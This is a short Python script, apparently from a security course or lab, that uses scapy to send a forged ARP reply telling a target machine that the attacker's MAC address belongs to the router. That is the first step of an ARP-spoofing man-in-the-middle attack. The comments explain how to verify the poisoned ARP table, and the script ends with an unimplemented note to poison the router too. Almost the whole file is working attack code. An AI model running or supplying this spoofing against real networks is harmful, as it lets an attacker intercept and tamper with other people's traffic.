#!/usr/bin/env python

import scapy.all as scapy

# set op to 2 for arp respond (for scapy parameters refer to scapy_options.py or onenote)
# packet creation to redirect them to the target i will act as the router the mac table of the target will associate
# my mac with the routers IP
packet = scapy.ARP(op=2, pdst="192.168.22.4", hwdst="08:00:27:e6:e5:59", psrc="192.168.22.1")
# examine the packet to confirm the flow
# print(packet.show())
# print(packet.summary())

# now send the packet
scapy.send(packet)
# then check the target machine again with arp -a (the router's 1p is acossiated with attacker's mac)
# check the attackers mac with ifconfig eth0

# then tell the router that i am the target

